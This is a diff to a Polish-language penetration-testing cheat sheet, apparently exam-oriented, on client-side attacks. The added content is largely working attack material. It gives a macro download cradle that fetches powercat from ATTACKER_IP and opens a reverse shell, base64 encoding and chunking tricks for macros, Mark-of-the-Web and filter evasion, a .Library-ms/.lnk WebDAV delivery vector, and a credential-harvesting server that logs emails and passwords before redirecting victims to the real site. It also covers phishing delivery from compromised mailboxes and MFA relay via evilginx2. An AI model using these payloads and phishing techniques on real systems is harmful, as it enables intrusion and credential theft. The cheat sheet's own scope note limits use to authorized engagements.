@@ -864,16 +864,47 @@ msfconsole -r handler.rc           # uruchom komendy z pliku (.rc)
 
 > ⚠️ Tylko w ramach **autoryzowanego** zaangażowania / labu. Cel: skłonić UŻYTKOWNIKA do uruchomienia kodu, gdy nie ma podatnej usługi sieciowej. Wektory: dokumenty z makrami, pliki HTA/LNK, sfałszowane strony logowania.
 
+> 🎯 **Drogowskaz:** 1) **recon celu NAJPIERW** — payload musi pasować do platformy. Znajdź dokumenty (`site:cel filetype:pdf`, `gobuster -x pdf`) → `exiftool -a -u` → Author (pretekst) + Producer (wersja Office). 2) potwierdź OS/przeglądarkę: Canarytoken/Grabify (UA kłamie, ufaj JS-fingerprint). 3) wektor: Office+makro / `.Library-ms`+`.lnk` / phishing creds. 4) infra ZAWSZE przed dostawą: web server + `nc -nvlp 4444`.
+
 ### Fingerprinting klienta
 ```bash
-exiftool -a -u brochure.pdf         # metadane pliku → wersje software'u ofiary
-# Serwuj stronę-pułapkę i czytaj User-Agent z logów, by dobrać exploit do przeglądarki/OS.
+exiftool -a -u brochure.pdf         # Author=pretekst, Producer/Creator=wersja Office; brak "for Mac"=Windows
+gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x pdf   # znajdź dokumenty (głośne)
+# Aktywnie: canarytokens.org (Web bug) / grabify.link → JS-fingerprint OS+przeglądarka (nie ufaj samemu UA)
 ```
 ### Makro Office (VBA) — download & execute
-> Szkielet: `Sub AutoOpen()` / `Sub Document_Open()` odpalają makro przy otwarciu pliku `.docm`. Makro uruchamia PowerShell z **download-cradle** (pobierz skrypt z Kali i wykonaj w pamięci):
+> Szkielet: `Sub AutoOpen()` / `Sub Document_Open()` odpalają makro przy otwarciu `.doc`/`.docm` (NIE `.docx`). Makro uruchamia PowerShell z **download-cradle**:
 ```powershell
 IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKER_IP/powercat.ps1'); powercat -c ATTACKER_IP -p 4444 -e powershell
 ```
+> ⚠️ **Surowy cradle często cicho pada** — zakoduj i potnij (dwa warunki działania `-enc`):
+```bash
+echo -n 'IEX(New-Object Net.WebClient)...' | iconv -t UTF-16LE | base64 -w0   # -enc przyjmuje TYLKO UTF-16LE!
+# limit 255 zn. na LITERAŁ VBA (nie na zmienną) → tnij base64 na kawałki: Str = Str + "..."
+python3 -c 's=open("b64.txt").read().strip();n=50;[print(f"Str = Str + \"{s[i:i+n]}\"") for i in range(0,len(s),n)]'
+# w makrze: powershell.exe -nop -w hidden -enc <sklejony $Str>
+```
+> **MOTW / Protected View:** ofiara musi *Enable Editing* (pokona MOTW) → *Enable Content* (odpala makro). Post-2013 Office blokuje makra z netu. **Omijają MOTW:** FAT32, wnętrze 7z/ISO/IMG. Sprawdź: `Get-Content plik.doc -Stream Zone.Identifier`. „Macros in" ustaw na bieżący dokument, nie global template.
+
+### Wektor .Library-ms + .lnk (WebDAV jako lokalny folder)
+> `.Library-ms` renderuje zdalny WebDAV jako folder w Explorerze i przechodzi przez filtry blokujące linki. W środku `.lnk` z cradle.
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@windows.storage.dll,-34582</name><version>6</version><isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+<templateInfo><folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType></templateInfo>
+<searchConnectorDescriptionList><searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation><isSupported>false</isSupported>
+<simpleLocation><url>http://ATTACKER_IP</url></simpleLocation>
+</searchConnectorDescription></searchConnectorDescriptionList></libraryDescription>
+```
+```bash
+# .lnk (target): powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/powercat.ps1');powercat -c ATTACKER_IP -p 4444 -e powershell"
+cp automatic_configuration.lnk /home/kali/webdav/     # serwuj powercat.ps1 z OSOBNEGO :8000 (nie z WebDAV — AV)
+smbclient //TARGET/share -c 'put config.Library-ms'   # dostawa
+```
+> `@windows.storage.dll,-34582` (nie `shell32.dll`) omija filtry łapiące „shell32". ⚠️ Po otwarciu Windows przepisuje `url` na `\\IP\DavWWWRoot` → **RESETUJ XML do oryginału przed KAŻDĄ wysyłką**, inaczej ofiara zobaczy pusty share. Nazwij `.lnk` benign (`automatic_configuration`).
 > Analiza podejrzanych makr (blue-team / weryfikacja): `olevba dokument.docm`.
 
 ### Dostawa payloadu przez WebDAV / HTTP
@@ -883,16 +914,29 @@ wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/   # 
 python3 -m http.server 80            # albo zwykły HTTP do download-cradle
 nc -nvlp 4444                        # listener na reverse shell
 ```
-### Phishing poświadczeń (koncepcja)
-> Sklonuj stronę logowania, podmień `action` formularza na własny serwer, hostuj, zbieraj wpisane dane:
+### Phishing poświadczeń
+> Sklonuj stronę logowania, podmień `action` na swój serwer, hostuj, zbieraj dane. `wget` szybko, ale SPA (Vue/CSRFGuard) pada → **single-file** (real Chromium renderuje DOM).
 ```bash
-wget -E -k -K -p -e robots=off -nd "https://przyklad.com/signin"    # zapisz stronę + zasoby
-single-file "https://przyklad.com/signin" signin.html \
-  --browser-executable-path /usr/bin/chromium                       # wierniejsza kopia SPA
-# w signin.html: <form action="http://ATTACKER_IP:8080/creds" method="POST">
-sudo python3 -m http.server 80       # hostuj klon; własny cred_server.py loguje POST /creds
+sudo apt install -y nodejs npm chromium && sudo npm install -g single-file-cli
+single-file "https://przyklad.com/signin" signin.html --browser-executable-path /usr/bin/chromium
+grep -oP '.{0,100}Next</span>' signin.html        # znajdź id przycisku (np. signin_btn_next) do podpięcia onclick
 ```
-> Wariant bez klonu: wymuś uwierzytelnienie NTLM (odwołanie do `\\ATTACKER_IP\share` w mailu/pliku) i przechwyć hash Responderem (§5.4). Zawsze w granicach zgody klienta.
+Weaponizacja klonu (BeautifulSoup — usuń cookie-SDK, podłóż krok hasła) + serwer zbierający z **302 misdirection**:
+```python
+# cred_server.py (:8080) — loguje i odsyła ofiarę na PRAWDZIWY serwis (myśli, że pomyliła hasło):
+from http.server import HTTPServer,BaseHTTPRequestHandler; from urllib.parse import parse_qs
+class H(BaseHTTPRequestHandler):
+  def do_POST(s):
+    d=parse_qs(s.rfile.read(int(s.headers.get('Content-Length',0))).decode())
+    print(f"[+] {d.get('email',[''])[0]} : {d.get('password',[''])[0]}")
+    s.send_response(302); s.send_header('Location','https://zoom.us/signin'); s.end_headers()
+HTTPServer(('0.0.0.0',8080),H).serve_forever()
+```
+```bash
+# w signin.html: <form action="http://ATTACKER_IP:8080/creds" method="POST">  (ATTACKER_IP = publiczny IP, nie 127.0.0.1!)
+python3 cred_server.py & sudo python3 -m http.server 80    # 2 serwery: zbieracz :8080 + host klonu :80
+```
+> **Dostawa:** z przejętego webmaila *Reply-all* w trybie HTML (URL ukryty pod „kliknij tutaj") — omija banery [EXTERNAL]. ⚠️ **MFA:** statyczne hasło nie wystarczy → real-time relay/BitM (**evilginx2**, cuddlephish). Wariant bez klonu: wymuś NTLM (`\\ATTACKER_IP\share`) + Responder (§5.4). Zawsze w granicach zgody klienta.
 
 ## 2.15 API attacks (REST / JSON)
 
